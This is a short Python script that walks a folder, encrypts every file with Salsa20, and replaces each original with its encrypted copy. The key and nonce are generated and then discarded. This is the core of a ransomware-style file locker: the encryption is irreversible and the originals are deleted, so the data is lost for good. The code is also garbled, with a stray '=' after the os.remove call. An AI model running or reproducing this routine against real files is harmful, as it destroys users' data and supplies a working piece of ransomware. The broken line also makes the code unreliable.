from Crypto.Cipher import Salsa20
from Crypto.Random import get_random_bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import time
import os
folder_path = "test"


def encrypt_file(file_path, key):
  start_time = time.time()
  cipher = Salsa20.new(key=key)
  with open(file_path, 'rb') as in_file, open(file_path + '.enc',
                                              'wb') as out_file:
    while True:
      chunk = in_file.read(128 * 1024)  # Read 128KB at a time
      if len(chunk) == 0:
        break
      encrypted_chunk = cipher.encrypt(chunk)
      out_file.write(encrypted_chunk)
    out_file.write(cipher.encrypt(b''))
  os.remove(
      file_path
  ) =
  os.rename(file_path + '.enc', file_path)  
  end_time = time.time()
  print(
      f"Encryption and replacement for {file_path} took {end_time - start_time} seconds"
  )


def encrypt_folder(folder_path, key):
  start_time = time.time()
  for root, dirs, files in os.walk(folder_path):
    for file in files:
      file_path = os.path.join(root, file)
      encrypt_file(file_path, key)
  end_time = time.time()
  print(f"Encryption took {end_time - start_time} seconds")


key = get_random_bytes(32)  # Salsa20 key
encrypt_folder(folder_path, key)
